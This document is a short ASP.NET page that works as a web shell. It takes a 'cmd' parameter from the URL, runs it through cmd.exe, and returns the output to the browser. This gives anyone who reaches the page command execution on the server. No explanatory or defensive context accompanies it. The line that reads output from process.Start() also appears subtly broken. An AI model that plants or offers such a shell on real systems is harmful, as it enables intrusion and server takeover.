<%@ Page Language="C#" %>
<%
string c = Request.QueryString["cmd"];
var process = new System.Diagnostics.Process
{
    StartInfo = new System.Diagnostics.ProcessStartInfo
    {
        FileName = "cmd.exe",
        Arguments = "/c " + c,
        UseShellExecute = false,
        RedirectStandardOutput = true
    }
};
string output = process.Start().StandardOutput.ReadToEnd();
Response.Write(output);
%>